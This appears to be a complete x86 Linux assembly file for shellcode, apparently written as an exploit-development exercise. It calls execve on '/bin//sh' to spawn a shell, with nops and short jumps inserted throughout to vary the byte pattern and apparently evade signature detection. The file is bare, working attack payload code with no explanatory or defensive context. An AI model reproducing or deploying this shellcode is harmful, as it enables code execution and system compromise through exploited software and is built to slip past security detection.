
global _start
_start:

		xor eax, eax
		push eax
		nop
		nop
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		push 0x68732f2f
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		push 0x6e69622f
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		mov ebx, esp
		
		push eax
		mov edx, esp
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		push ebx
		mov ecx, esp
	
		mov al, 0xb
		nop
		jmp short $+6
		nop
		nop
		nop
		nop
		int 0x80
		nop
		nop


		
		
		
		
			
